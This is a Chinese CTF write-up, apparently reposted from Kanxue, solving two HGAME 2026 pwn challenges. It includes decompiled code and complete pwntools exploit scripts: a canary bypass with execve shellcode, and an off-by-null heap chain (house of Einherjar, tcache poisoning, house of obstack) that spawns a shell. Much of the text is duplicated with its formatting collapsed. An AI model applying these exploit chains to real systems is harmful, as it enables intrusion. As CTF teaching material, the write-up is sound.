# HGAME 2026复现

> 原文: https://www.ctfiot.com/301877.html
> ID: 301877

week1-adrift

int__fastcallmain(intargc,constchar**argv,constchar**envp){ _QWORD *v3;// rdx __int16 v4;// ax __int16 v6[2];// [rsp+0h] [rbp-400h] BYREF __int16 i;// [rsp+4h] [rbp-3FCh] _QWORD v8[125];// [rsp+6h] [rbp-3FAh] BYREF __int64 v9;// [rsp+3F0h] [rbp-10h]init_canary(argc, argv, envp); v9 = canary;putchar(10);while(1) {printf("choose> "); __isoc99_scanf("%hd", v6);switch( v6[0] ) {case0:
printf("way> ");read(0, v8,0x410uLL);printf("distance> ");for( i =0; i <=200&& dis[i]; ++i ) ; v3 = (_QWORD *)((char*)&str +1304* i); *v3 = v8[0]; v3[124] = v8[124];qmemcpy( (void*)((unsigned__int64)(v3 +1) &0xFFFFFFFFFFFFFFF8LL), (constvoid*)((char*)v8 - ((char*)v3 - ((unsigned__int64)(v3 +1) &0xFFFFFFFFFFFFFFF8LL))),8LL* ((((_DWORD)v3 - (((_DWORD)v3 +8) &0xFFFFFFF8) +1000) &0xFFFFFFF8) >>3));memset(v8,0,sizeof(v8)); __isoc99_scanf("%lu", &dis[i]);break;case1:
delete();break;case2:
show();break;case3:
printf("index> "); __isoc99_scanf("%hd", v6); v4 = v6[0];if( v6[0] <=0) v4 = -v6[0]; v6[0] = v4;if( v4 >200) {puts("invalid index"); }else {printf("a new distance> "); __isoc99_scanf("%lu", &dis[v6[0]]); }break;case4:if( v9 != canary ) {printf("it's a poor decision :(");exit(0); }return0;default:
continue; } }}

init_canary(argc, argv, envp);v9 = canary;__int64 *init_canary(){ __int64 *result;// rax __int64 v1;// [rsp+8h] [rbp-8h] BYREFsetvbuf(stdout, 0LL,2, 0LL);setvbuf(stdin, 0LL,2, 0LL);setvbuf(stderr, 0LL,2, 0LL); v1 = (__int64)&v1; result = &v1; canary = (__int64)&v1;returnresult;}

intdelete(){ __int16 v1;//[rsp+Eh] [rbp-2h]printf("index> "); __isoc99_scanf("%hd"); dis[v1 %201] = 0LL;returnprintf("%hd", (unsignedint)(v1 %201));}

intshow(){ __int64 v0;// rax __int16 v2;// [rsp+Eh] [rbp-2h] BYREFprintf("index> "); __isoc99_scanf("%hd", &v2);LOWORD(v0) = v2;if( v2 <=0)LOWORD(v0) = -v2; v2 = v0;LODWORD(v0) = (unsigned__int16)v0;if( (__int16)v0 <=199) { v0 = dis[v2];if( v0 )LODWORD(v0) =printf(": %lun", dis[v2]); }returnv0;}

（十六进制0x0005）

按位取反：1111 1111 1111 1010（0xFFFA）

再 +1：1111 1111 1111 1011（0xFFFB）

的 16 位补码 =1111 1111 1111 1011（0xFFFB）

按位取反：0000 0000 0000 0100（0x0004）

再 +1：0000 0000 0000 0101（0x0005）

=+5

选择case2打印canary的值，泄露栈地址。

选择case3修改canary的值，绕过case4的检查。

选择case0的栈溢出写入shellcode，并将返回地址覆盖为shellcode的地址（通过调试计算偏移）

选择case4触发shellcode执行

frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')io = process('./vuln')#io = remote("cloud-middle.hgame.vidar.club",32265)io.sendlineafter(b"choose> ",b"2")io.sendlineafter(b"index> ",b"-32768")io.recvuntil(b": ")aa =int(io.recvuntil(b"n",drop=True))log.success(hex(aa))shellcode = asm(''' pop r11 mov rax, 0x68732f6e69622f push rax push rsp pop rdi xor eax, eax mov al, 59 xor rdx, rdx syscall''')
# 因为rsp和shellcode挨得很近，两次push会破坏shellcode，所以这里我先pop一次抬高rsp的地址
# rsi在调试的时候发现是0，就不用去赋值了log.info(len(shellcode))addr = aa +0x408log.success(hex(addr))payload =b'a'*(0x3e8+2)+shellcode+p64(addr)io.sendlineafter(b"choose> ",b"3")io.sendlineafter(b"index> ",b"-32768")n =int.from_bytes(shellcode[:8], byteorder="little", signed=False)log.success(hex(n))io.sendlineafter(b"a new distance> ",str(n).encode())io.sendlineafter(b"choose> ",b"0")
# gdb.attach(io,'b *$rebase(0x14EE)')
# pause()io.sendafter(b"way> ",payload)io.sendlineafter(b"distance> ",b'233')io.sendlineafter(b"choose> ",b"4")io.interactive()

week2-diary keeper

patchelf --set-interpreter /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/ld-linux-x86-64.so.2 ./vulnpatchelf --replace-needed libc.so.6 /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/libc.so.6 ./vuln

#definePROTECT_PTR(pos, ptr) ((__typeof (ptr)) ((((size_t) pos) >>12) ^ ((size_t) ptr)))

申请chunkA、chunkB、chunk C、chunk D，chunk D用来做gap，chunkA、chunk C都要处于unsortedbin范围释放A，进入unsortedbin对B写操作的时候存在off by null，修改了C的P位释放C的时候，堆后向合并，直接把A、B、C三块内存合并为了一个chunk，并放到了unsortedbin里面读写合并后的大chunk可以操作chunkB的内容

payload = flat( {0x8:1,0x10:0,0x38:
address_for_rdi,0x28:
address_for_call,0x18:1,0x20:0,0x40:1,0xd0:
heap_base+0x250,0xc8:
libc_base+ get_IO_str_jumps() -0x300+0x20 }, filler ='x00')

__int64sub_127C(){write(1,"1.write a new diary.n",0x15uLL);write(1,"2.delete a diary.n",0x13uLL);write(1,"3.show a diary.n",0x11uLL);write(1,"4.exit.n",8uLL);write(1,"input your choice:",0x12uLL);returnsub_1229();}void__fastcall __noreturnmain(inta1,char**a2,char**a3){intv3;// [rsp+Ch] [rbp-4h]write(1,"Let's start writing a diary!n",0x1DuLL);memset(&dword_4360,0,0x190uLL);while(1) { v3 =sub_127C();if( v3 ==4) {write(1,"Goodbye!n",9uLL);exit(0); }if( v3 >4) {LABEL_12:
write(1,"You can't do that.n",0x13uLL); }else {switch( v3 ) {case3:
sub_15EB();break;case1:
sub_130D();break;case2:
sub_1553();break;default:
gotoLABEL_12; } } }}

_DWORD *sub_130D(){ _DWORD *result;//raxintv1;//[rsp+0h] [rbp-10h]intv2;//[rsp+4h] [rbp-Ch]intv3;//[rsp+Ch] [rbp-4h]write(1,"input index:",0xCuLL); v1 = sub_1229();if( (unsignedint)v1 >=0x64)return(_DWORD *)write(1,"Invalid index!n",0xFuLL);if( *((_QWORD *)&unk_4040+ v1) )return(_DWORD *)write(1,"Note at index already exists!n",0x1EuLL);write(1,"size:",5uLL); v2 = sub_1229(); *((_QWORD *)&unk_4040+ v1) = malloc(v2 +16);if( !*((_QWORD *)&unk_4040+ v1) )return(_DWORD *)write(1,"Memory allocation failed!n",0x1AuLL);write(1,"date:",5uLL);read(0, *((void **)&unk_4040+ v1),8uLL);write(1,"weather:",0x12uLL);read(0, (void *)(*((_QWORD *)&unk_4040+ v1) +8LL),8uLL);write(1,"content:",8uLL); v3 =read(0, (void *)(*((_QWORD *)&unk_4040+ v1) +16LL), v2); *(_BYTE *)(*((_QWORD *)&unk_4040+ v1) + v3 +16) =0; result = dword_4360; dword_4360[v1] = v3 +16;returnresult;}

intsub_1553(){ _DWORD *v0;// raxintv2;// [rsp+Ch] [rbp-4h]write(1,"input index:",0xCuLL);LODWORD(v0) =sub_1229(); v2 = (int)v0;if( (unsignedint)v0 <=0x63) {free(*((void**)&unk_4040 + (int)v0)); *((_QWORD *)&unk_4040 + v2) =0LL; v0 = dword_4360; dword_4360[v2] =0; }return(int)v0;}

intsub_15EB(){ __int64 v0;// raxintv2;// [rsp+Ch] [rbp-4h]write(1,"input index:",0xCuLL);LODWORD(v0) =sub_1229(); v2 = v0;if( (unsignedint)v0 <=0x63) { v0 = *((_QWORD *)&unk_4040 + (int)v0);if( v0 ) {write(1,"Date: ",6uLL);write(1, *((constvoid**)&unk_4040 + v2),8uLL);write(1,"n",1uLL);write(1,"Weather: ",9uLL);write(1, (constvoid*)(*((_QWORD *)&unk_4040 + v2) +8LL),8uLL);write(1,"n",1uLL);write(1,"Content: ",9uLL);write(1, (constvoid*)(*((_QWORD *)&unk_4040 + v2) +16LL), dword_4360[v2] -16);LODWORD(v0) =write(1,"n",1uLL); } }returnv0;}

泄露libc基址和heap基址：首先申请四个chunk，记A，B，C，D，A和C分别属于large bin的范围（B是为了防止在free时A和C合并，D则是防止C和top chunk合并），接着free chunkA和chunkC，此时unsorted bin->chunkC->chunkA->unsorted bin。因此chunkA的fd指针指向main_arena+0x60，bk指针指向chunkC的首地址，只要我们重新申请回chunkA，接着利用打印功能打印Date和Weather，就可以泄露libc基址和heap基址。

house of Einherjar：首先申请9个size为0x100的chunk，记为chunk1，chunk2。。。chunk9。chunk7在申请的时候要先写入fake chunk，依次free chunk1-chunk6，chunk8，此时tcache bin满了，再申请chunk8并利用off by null覆写chunk9的size的P位，接着free chunk8，此时tcache已满，再free chunk9，触发unlink，会把chunk7，chunk8，chunk9合并为一个大chunk放入unsortedbin中

tcache poisoning：此时unosortedbin中存在chunk7，chunk8，chunk9合并成的一个大chunk，记为big chunk，而chunk8位于tcache bin中，我们可以申请回big chunk，覆写chunk8的next指针指向(&e->next >> 12) ^ _IO_list_all（为了绕过safe linking），接着申请两次size为0x100的chunk，会从tcache里取，第二次就申请到了_IO_list_all，覆盖该值为一个堆地址，这里覆盖为chunkC+0x20的地址。

house of obstack：接着就是free chunkC，重新申请chunkC写入伪造的IO_file结构，按obstack利用链的模板。最后退出程序触发_IO_flush_all_lockp获取shell。

defadd(index,size,date,weather,content): io.sendlineafter("input your choice:",b'1') io.sendlineafter("input index:",str(index).encode()) io.sendlineafter("size:",str(size).encode()) io.sendlineafter("date",date) io.sendlineafter("weather:",weather) io.sendlineafter("content:",content)defdele(index): io.sendlineafter("input your choice:",b'2') io.sendlineafter("input index:",str(index).encode())defshow(index): io.sendlineafter("input your choice:",b'3') io.sendlineafter("input index:",str(index).encode())

add(0,0x410,b'',b'',b'')
# chunkAadd(1,0x40,b'',b'',b'')
# chunkB，防止A和C合并add(2,0x420,b'',b'',b'')
# chunkCadd(3,0x40,b'',b'',b'')
# chunkD，防止C和top chunk合并dele(0)dele(2)
# 此时unsorted bin为unsorted bin -> chunkC -> chunkA

add(0,0x410,b'',b'',b'')show(0) #申请回chunkA并打印地址信息io.recvuntil(b"Date: ")libc_base = u64(io.recv(6).ljust(8,b"x00")) -0x21ac0a
# 泄露libc基址log.success(hex(libc_base))io.recvuntil(b"Weather: ")heap_base = u64(io.recv(6).ljust(8,b"x00")) -0x70a
# 泄露heap基址log.success(hex(heap_base))

add(2,0x420,b'',b'',b'')
# 申请回chunkC，防止被split

# 申请六个chunk，分别记为chunk1，chunk2。。chunk6foriinrange(6):
add(4+i,0xe0,b'',b'',b'')''伪造fake chunk，heap_base+0x11e0是chunk7首地址+0x20的地址p64(heap_base+0x11e0)*2是为了绕过if (__builtin_expect (FD->bk!=P||BK->fd!=P,0)) malloc_printerr ("corrupted double-linked list");'''payload1 = p64(0) + p64(0x1e0) + p64(heap_base + 0x11e0)*2add(10,0xe0,b'',b'',payload1) # 申请chunk7add(11,0xe0,b'',b'',b'')
# 申请chunk8add(12,0xe0,b'',b'',b'')
# 申请chunk9

foriinrange(6):#依次free chunk1-chunk6，会放入tcache bindele(4+i)dele(11) # free chunk8，此时tcachebin满了

payload2 = b'a'*0xe0+ p64(0x1e0)
# 重新申请回chunk8，写prev_size，利用off by null覆写chunk9的P位
# 因为off by null是写一个字节，所以chunk的size最好是0x100这种最后一个字节为0x00的，不然会报错，所以我之前申请的都是malloc(0xe0+16)add(11,0xe8,b'',b'',payload2)add(13,0x40,b'',b'',payload2)
# 防止big chunk和top chunk合并，方便观察，其实和top chunk合并也可以dele(11)
# free chunk8，此时tcachebin又满了dele(12)
# free chunk9，触发unlink，把chunk7，8，9合并成一个big chunk存入unsorted bin

system = libc_base + libc.symbols['system']bin_sh = libc_base + next(libc.search(b'/bin/shx00'))IO_list_all = libc_base + libc.symbols['_IO_list_all']io_list = (heap_base +0x12d0) >>12^ IO_list_all
# 覆盖next指针用的，为了绕过safe-linking_IO_obstack_jumps = libc_base +0x2173c0payload3 = b'a'*0xc8+ p64(0x101) + p64(io_list)add(14,0x2c0,b'',b'',payload3)
# 申请回big chunk，覆写chunk8的next指针add(15,0xe0,b'',b'',b'')
# 申请chunk8add(16,0xe0,p64(heap_base+0x740),b'',b'')
# 申请我们指向的IO_list_all，这里heap_base+0x740写的是chunkC+0x20的地址

hex((0x5612b4e3d2d0>>12)^0x5612b4e3d0d0)'0x5617d5c89eed'

dele(2)
# free chunkCpayload4 = flat( {0x18:1,0x20:0,0x28:1,0x30:0,0x38:
p64(system),0x48:
p64(bin_sh),0x50:1,0xd8:
p64(_IO_obstack_jumps+0x20),0xe0:
p64(heap_base +0x740), }, filler ='x00' )#申请回chunkC并伪造IO_fileadd(2,0x420,b'',b'',payload4)#退出程序触发利用链io.sendlineafter("input your choice:",b'4')io.interactive()

frompwnimport*context(log_level ='debug', arch ='amd64', os ='linux')io=process("./vuln")libc = ELF("./libc.so.6")defadd(index,size,date,weather,content): io.sendlineafter("input your choice:",b'1') io.sendlineafter("input index:",str(index).encode()) io.sendlineafter("size:",str(size).encode()) io.sendlineafter("date",date) io.sendlineafter("weather:",weather) io.sendlineafter("content:",content)defdele(index): io.sendlineafter("input your choice:",b'2') io.sendlineafter("input index:",str(index).encode())defshow(index): io.sendlineafter("input your choice:",b'3') io.sendlineafter("input index:",str(index).encode())
# ------------------泄露libc基址和heap基址----------------------------add(0,0x410,b'',b'',b'')
# chunkAadd(1,0x40,b'',b'',b'')
# chunkB，防止A和C合并add(2,0x420,b'',b'',b'')
# chunkCadd(3,0x40,b'',b'',b'')
# chunkD，防止C和top chunk合并dele(0)dele(2)
# 此时unsorted bin为unsorted bin -> chunkC -> chunkAgdb.attach(io,"b *$rebase(0x17D4)")add(0,0x410,b'',b'',b'')show(0)#申请回chunkA并打印地址信息io.recvuntil(b"Date: ")libc_base = u64(io.recv(6).ljust(8,b"x00")) -0x21ac0a
# 泄露libc基址log.success(hex(libc_base))io.recvuntil(b"Weather: ")heap_base = u64(io.recv(6).ljust(8,b"x00")) -0x70a
# 泄露heap基址log.success(hex(heap_base))add(2,0x420,b'',b'',b'')
# 申请回chunkC，防止被split
# ------------------house of Einherjar和tcache poisoning----------------------------# 申请六个chunk，分别记为chunk1，chunk2。。chunk6foriinrange(6): add(4+i,0xe0,b'',b'',b'')'''伪造fake chunk，heap_base + 0x11e0是chunk7首地址+0x20的地址p64(heap_base + 0x11e0)*2是为了绕过if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr ("corrupted double-linked list");'''payload1 = p64(0) + p64(0x1e0) + p64(heap_base +0x11e0)*2add(10,0xe0,b'',b'',payload1)
# 申请chunk7add(11,0xe0,b'',b'',b'')
# 申请chunk8add(12,0xe0,b'',b'',b'')
# 申请chunk9foriinrange(6):#依次free chunk1-chunk6，会放入tcache bin dele(4+i)dele(11)
# free chunk8，此时tcachebin满了payload2 =b'a'*0xe0+ p64(0x1e0)
# 重新申请回chunk8，写prev_size，利用off by null覆写chunk9的P位
# 因为off by null是写一个字节，所以chunk的size最好是0x100这种最后一个字节为0x00的，不然会报错，所以我之前申请的都是malloc(0xe0+16)add(11,0xe8,b'',b'',payload2)dele(11)
# free chunk8，此时tcachebin又满了dele(12)
# free chunk9，触发unlink，把chunk7，8，9合并成一个big chunk存入unsorted binsystem = libc_base + libc.symbols['system']bin_sh = libc_base +next(libc.search(b'/bin/shx00'))IO_list_all = libc_base + libc.symbols['_IO_list_all']io_list = (heap_base +0x12d0) >>12^ IO_list_all
# 覆盖next指针用的，为了绕过safe-linking_IO_obstack_jumps = libc_base +0x2173c0payload3 =b'a'*0xc8+ p64(0x101) + p64(io_list)add(13,0x2c0,b'',b'',payload3)
# 申请回big chunk，覆写chunk8的next指针add(14,0xe0,b'',b'',b'')
# 申请chunk8
# -------------------------house of obstack------------------------------add(15,0xe0,p64(heap_base+0x740),b'',b'')
# 申请我们指向的IO_list_all，这里heap_base+0x740写的是chunkC+0x20的地址dele(2)
# free chunkCpayload4 = flat( {0x18:1,0x20:0,0x28:1,0x30:0,0x38:
p64(system),0x48:
p64(bin_sh),0x50:1,0xd8:
p64(_IO_obstack_jumps+0x20),0xe0:
p64(heap_base +0x740), }, filler ='x00' )#申请回chunkC并伪造IO_fileadd(2,0x420,b'',b'',payload4)#退出程序触发利用链io.sendlineafter("input your choice:",b'4')io.interactive()

参考链接

看雪ID：G0t1T

https://bbs.kanxue.com/user-home-1002337.htm

*本文为看雪论坛优秀文章，由G0t1T原创，转载请注明来自看雪社区

# 往期推荐

逆向分析某手游基于异常的内存保护

解决Il2cppapi混淆，通杀DumpUnityCs文件

记录一次Unity加固的探索与实现

DLINK路由器命令注入漏洞从1DAY到0DAY

量子安全 quantum ctf Global Hyperlink Zone Hack the box

球分享

球点赞

球在看

点击阅读原文查看更多


```
int__fastcallmain(intargc,constchar**argv,constchar**envp){ _QWORD *v3;// rdx __int16 v4;// ax __int16 v6[2];// [rsp+0h] [rbp-400h] BYREF __int16 i;// [rsp+4h] [rbp-3FCh] _QWORD v8[125];// [rsp+6h] [rbp-3FAh] BYREF __int64 v9;// [rsp+3F0h] [rbp-10h]init_canary(argc, argv, envp); v9 = canary;putchar(10);while(1) {printf("choose> "); __isoc99_scanf("%hd", v6);switch( v6[0] ) {case0:
printf("way> ");read(0, v8,0x410uLL);printf("distance> ");for( i =0; i <=200&& dis[i]; ++i ) ; v3 = (_QWORD *)((char*)&str +1304* i); *v3 = v8[0]; v3[124] = v8[124];qmemcpy( (void*)((unsigned__int64)(v3 +1) &0xFFFFFFFFFFFFFFF8LL), (constvoid*)((char*)v8 - ((char*)v3 - ((unsigned__int64)(v3 +1) &0xFFFFFFFFFFFFFFF8LL))),8LL* ((((_DWORD)v3 - (((_DWORD)v3 +8) &0xFFFFFFF8) +1000) &0xFFFFFFF8) >>3));memset(v8,0,sizeof(v8)); __isoc99_scanf("%lu", &dis[i]);break;case1:
delete();break;case2:
show();break;case3:
printf("index> "); __isoc99_scanf("%hd", v6); v4 = v6[0];if( v6[0] <=0) v4 = -v6[0]; v6[0] = v4;if( v4 >200) {puts("invalid index"); }else {printf("a new distance> "); __isoc99_scanf("%lu", &dis[v6[0]]); }break;case4:if( v9 != canary ) {printf("it's a poor decision :(");exit(0); }return0;default:
continue; } }}
init_canary(argc, argv, envp);v9 = canary;__int64 *init_canary(){ __int64 *result;// rax __int64 v1;// [rsp+8h] [rbp-8h] BYREFsetvbuf(stdout, 0LL,2, 0LL);setvbuf(stdin, 0LL,2, 0LL);setvbuf(stderr, 0LL,2, 0LL); v1 = (__int64)&v1; result = &v1; canary = (__int64)&v1;returnresult;}
intdelete(){ __int16 v1;//[rsp+Eh] [rbp-2h]printf("index> "); __isoc99_scanf("%hd"); dis[v1 %201] = 0LL;returnprintf("%hd", (unsignedint)(v1 %201));}
intshow(){ __int64 v0;// rax __int16 v2;// [rsp+Eh] [rbp-2h] BYREFprintf("index> "); __isoc99_scanf("%hd", &v2);LOWORD(v0) = v2;if( v2 <=0)LOWORD(v0) = -v2; v2 = v0;LODWORD(v0) = (unsigned__int16)v0;if( (__int16)v0 <=199) { v0 = dis[v2];if( v0 )LODWORD(v0) =printf(": %lun", dis[v2]); }returnv0;}
frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')io = process('./vuln')#io = remote("cloud-middle.hgame.vidar.club",32265)io.sendlineafter(b"choose> ",b"2")io.sendlineafter(b"index> ",b"-32768")io.recvuntil(b": ")aa =int(io.recvuntil(b"n",drop=True))log.success(hex(aa))shellcode = asm(''' pop r11 mov rax, 0x68732f6e69622f push rax push rsp pop rdi xor eax, eax mov al, 59 xor rdx, rdx syscall''')
# 因为rsp和shellcode挨得很近，两次push会破坏shellcode，所以这里我先pop一次抬高rsp的地址
# rsi在调试的时候发现是0，就不用去赋值了log.info(len(shellcode))addr = aa +0x408log.success(hex(addr))payload =b'a'*(0x3e8+2)+shellcode+p64(addr)io.sendlineafter(b"choose> ",b"3")io.sendlineafter(b"index> ",b"-32768")n =int.from_bytes(shellcode[:8], byteorder="little", signed=False)log.success(hex(n))io.sendlineafter(b"a new distance> ",str(n).encode())io.sendlineafter(b"choose> ",b"0")
# gdb.attach(io,'b *$rebase(0x14EE)')
# pause()io.sendafter(b"way> ",payload)io.sendlineafter(b"distance> ",b'233')io.sendlineafter(b"choose> ",b"4")io.interactive()
patchelf --set-interpreter /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/ld-linux-x86-64.so.2 ./vulnpatchelf --replace-needed libc.so.6 /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/libc.so.6 ./vuln
    #definePROTECT_PTR(pos, ptr) ((__typeof (ptr)) ((((size_t) pos) >>12) ^ ((size_t) ptr)))
申请chunkA、chunkB、chunk C、chunk D，chunk D用来做gap，chunkA、chunk C都要处于unsortedbin范围释放A，进入unsortedbin对B写操作的时候存在off by null，修改了C的P位释放C的时候，堆后向合并，直接把A、B、C三块内存合并为了一个chunk，并放到了unsortedbin里面读写合并后的大chunk可以操作chunkB的内容
payload = flat( {0x8:1,0x10:0,0x38:
address_for_rdi,0x28:
address_for_call,0x18:1,0x20:0,0x40:1,0xd0:
heap_base+0x250,0xc8:
libc_base+ get_IO_str_jumps() -0x300+0x20 }, filler ='x00')
__int64sub_127C(){write(1,"1.write a new diary.n",0x15uLL);write(1,"2.delete a diary.n",0x13uLL);write(1,"3.show a diary.n",0x11uLL);write(1,"4.exit.n",8uLL);write(1,"input your choice:",0x12uLL);returnsub_1229();}void__fastcall __noreturnmain(inta1,char**a2,char**a3){intv3;// [rsp+Ch] [rbp-4h]write(1,"Let's start writing a diary!n",0x1DuLL);memset(&dword_4360,0,0x190uLL);while(1) { v3 =sub_127C();if( v3 ==4) {write(1,"Goodbye!n",9uLL);exit(0); }if( v3 >4) {LABEL_12:
write(1,"You can't do that.n",0x13uLL); }else {switch( v3 ) {case3:
sub_15EB();break;case1:
sub_130D();break;case2:
sub_1553();break;default:
gotoLABEL_12; } } }}
_DWORD *sub_130D(){ _DWORD *result;//raxintv1;//[rsp+0h] [rbp-10h]intv2;//[rsp+4h] [rbp-Ch]intv3;//[rsp+Ch] [rbp-4h]write(1,"input index:",0xCuLL); v1 = sub_1229();if( (unsignedint)v1 >=0x64)return(_DWORD *)write(1,"Invalid index!n",0xFuLL);if( *((_QWORD *)&unk_4040+ v1) )return(_DWORD *)write(1,"Note at index already exists!n",0x1EuLL);write(1,"size:",5uLL); v2 = sub_1229(); *((_QWORD *)&unk_4040+ v1) = malloc(v2 +16);if( !*((_QWORD *)&unk_4040+ v1) )return(_DWORD *)write(1,"Memory allocation failed!n",0x1AuLL);write(1,"date:",5uLL);read(0, *((void **)&unk_4040+ v1),8uLL);write(1,"weather:",0x12uLL);read(0, (void *)(*((_QWORD *)&unk_4040+ v1) +8LL),8uLL);write(1,"content:",8uLL); v3 =read(0, (void *)(*((_QWORD *)&unk_4040+ v1) +16LL), v2); *(_BYTE *)(*((_QWORD *)&unk_4040+ v1) + v3 +16) =0; result = dword_4360; dword_4360[v1] = v3 +16;returnresult;}
intsub_1553(){ _DWORD *v0;// raxintv2;// [rsp+Ch] [rbp-4h]write(1,"input index:",0xCuLL);LODWORD(v0) =sub_1229(); v2 = (int)v0;if( (unsignedint)v0 <=0x63) {free(*((void**)&unk_4040 + (int)v0)); *((_QWORD *)&unk_4040 + v2) =0LL; v0 = dword_4360; dword_4360[v2] =0; }return(int)v0;}
intsub_15EB(){ __int64 v0;// raxintv2;// [rsp+Ch] [rbp-4h]write(1,"input index:",0xCuLL);LODWORD(v0) =sub_1229(); v2 = v0;if( (unsignedint)v0 <=0x63) { v0 = *((_QWORD *)&unk_4040 + (int)v0);if( v0 ) {write(1,"Date: ",6uLL);write(1, *((constvoid**)&unk_4040 + v2),8uLL);write(1,"n",1uLL);write(1,"Weather: ",9uLL);write(1, (constvoid*)(*((_QWORD *)&unk_4040 + v2) +8LL),8uLL);write(1,"n",1uLL);write(1,"Content: ",9uLL);write(1, (constvoid*)(*((_QWORD *)&unk_4040 + v2) +16LL), dword_4360[v2] -16);LODWORD(v0) =write(1,"n",1uLL); } }returnv0;}
defadd(index,size,date,weather,content): io.sendlineafter("input your choice:",b'1') io.sendlineafter("input index:",str(index).encode()) io.sendlineafter("size:",str(size).encode()) io.sendlineafter("date",date) io.sendlineafter("weather:",weather) io.sendlineafter("content:",content)defdele(index): io.sendlineafter("input your choice:",b'2') io.sendlineafter("input index:",str(index).encode())defshow(index): io.sendlineafter("input your choice:",b'3') io.sendlineafter("input index:",str(index).encode())
add(0,0x410,b'',b'',b'')
# chunkAadd(1,0x40,b'',b'',b'')
# chunkB，防止A和C合并add(2,0x420,b'',b'',b'')
# chunkCadd(3,0x40,b'',b'',b'')
# chunkD，防止C和top chunk合并dele(0)dele(2)
# 此时unsorted bin为unsorted bin -> chunkC -> chunkA
add(0,0x410,b'',b'',b'')show(0) #申请回chunkA并打印地址信息io.recvuntil(b"Date: ")libc_base = u64(io.recv(6).ljust(8,b"x00")) -0x21ac0a
# 泄露libc基址log.success(hex(libc_base))io.recvuntil(b"Weather: ")heap_base = u64(io.recv(6).ljust(8,b"x00")) -0x70a
# 泄露heap基址log.success(hex(heap_base))
add(2,0x420,b'',b'',b'')
# 申请回chunkC，防止被split
# 申请六个chunk，分别记为chunk1，chunk2。。chunk6foriinrange(6):
add(4+i,0xe0,b'',b'',b'')''伪造fake chunk，heap_base+0x11e0是chunk7首地址+0x20的地址p64(heap_base+0x11e0)*2是为了绕过if (__builtin_expect (FD->bk!=P||BK->fd!=P,0)) malloc_printerr ("corrupted double-linked list");'''payload1 = p64(0) + p64(0x1e0) + p64(heap_base + 0x11e0)*2add(10,0xe0,b'',b'',payload1) # 申请chunk7add(11,0xe0,b'',b'',b'')
# 申请chunk8add(12,0xe0,b'',b'',b'')
# 申请chunk9
foriinrange(6):#依次free chunk1-chunk6，会放入tcache bindele(4+i)dele(11) # free chunk8，此时tcachebin满了
payload2 = b'a'*0xe0+ p64(0x1e0)
# 重新申请回chunk8，写prev_size，利用off by null覆写chunk9的P位
# 因为off by null是写一个字节，所以chunk的size最好是0x100这种最后一个字节为0x00的，不然会报错，所以我之前申请的都是malloc(0xe0+16)add(11,0xe8,b'',b'',payload2)add(13,0x40,b'',b'',payload2)
# 防止big chunk和top chunk合并，方便观察，其实和top chunk合并也可以dele(11)
# free chunk8，此时tcachebin又满了dele(12)
# free chunk9，触发unlink，把chunk7，8，9合并成一个big chunk存入unsorted bin
system = libc_base + libc.symbols['system']bin_sh = libc_base + next(libc.search(b'/bin/shx00'))IO_list_all = libc_base + libc.symbols['_IO_list_all']io_list = (heap_base +0x12d0) >>12^ IO_list_all
# 覆盖next指针用的，为了绕过safe-linking_IO_obstack_jumps = libc_base +0x2173c0payload3 = b'a'*0xc8+ p64(0x101) + p64(io_list)add(14,0x2c0,b'',b'',payload3)
# 申请回big chunk，覆写chunk8的next指针add(15,0xe0,b'',b'',b'')
# 申请chunk8add(16,0xe0,p64(heap_base+0x740),b'',b'')
# 申请我们指向的IO_list_all，这里heap_base+0x740写的是chunkC+0x20的地址
hex((0x5612b4e3d2d0>>12)^0x5612b4e3d0d0)'0x5617d5c89eed'
dele(2)
# free chunkCpayload4 = flat( {0x18:1,0x20:0,0x28:1,0x30:0,0x38:
p64(system),0x48:
p64(bin_sh),0x50:1,0xd8:
p64(_IO_obstack_jumps+0x20),0xe0:
p64(heap_base +0x740), }, filler ='x00' )#申请回chunkC并伪造IO_fileadd(2,0x420,b'',b'',payload4)#退出程序触发利用链io.sendlineafter("input your choice:",b'4')io.interactive()
frompwnimport*context(log_level ='debug', arch ='amd64', os ='linux')io=process("./vuln")libc = ELF("./libc.so.6")defadd(index,size,date,weather,content): io.sendlineafter("input your choice:",b'1') io.sendlineafter("input index:",str(index).encode()) io.sendlineafter("size:",str(size).encode()) io.sendlineafter("date",date) io.sendlineafter("weather:",weather) io.sendlineafter("content:",content)defdele(index): io.sendlineafter("input your choice:",b'2') io.sendlineafter("input index:",str(index).encode())defshow(index): io.sendlineafter("input your choice:",b'3') io.sendlineafter("input index:",str(index).encode())
# ------------------泄露libc基址和heap基址----------------------------add(0,0x410,b'',b'',b'')
# chunkAadd(1,0x40,b'',b'',b'')
# chunkB，防止A和C合并add(2,0x420,b'',b'',b'')
# chunkCadd(3,0x40,b'',b'',b'')
# chunkD，防止C和top chunk合并dele(0)dele(2)
# 此时unsorted bin为unsorted bin -> chunkC -> chunkAgdb.attach(io,"b *$rebase(0x17D4)")add(0,0x410,b'',b'',b'')show(0)#申请回chunkA并打印地址信息io.recvuntil(b"Date: ")libc_base = u64(io.recv(6).ljust(8,b"x00")) -0x21ac0a
# 泄露libc基址log.success(hex(libc_base))io.recvuntil(b"Weather: ")heap_base = u64(io.recv(6).ljust(8,b"x00")) -0x70a
# 泄露heap基址log.success(hex(heap_base))add(2,0x420,b'',b'',b'')
# 申请回chunkC，防止被split
# ------------------house of Einherjar和tcache poisoning----------------------------# 申请六个chunk，分别记为chunk1，chunk2。。chunk6foriinrange(6): add(4+i,0xe0,b'',b'',b'')'''伪造fake chunk，heap_base + 0x11e0是chunk7首地址+0x20的地址p64(heap_base + 0x11e0)*2是为了绕过if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr ("corrupted double-linked list");'''payload1 = p64(0) + p64(0x1e0) + p64(heap_base +0x11e0)*2add(10,0xe0,b'',b'',payload1)
# 申请chunk7add(11,0xe0,b'',b'',b'')
# 申请chunk8add(12,0xe0,b'',b'',b'')
# 申请chunk9foriinrange(6):#依次free chunk1-chunk6，会放入tcache bin dele(4+i)dele(11)
# free chunk8，此时tcachebin满了payload2 =b'a'*0xe0+ p64(0x1e0)
# 重新申请回chunk8，写prev_size，利用off by null覆写chunk9的P位
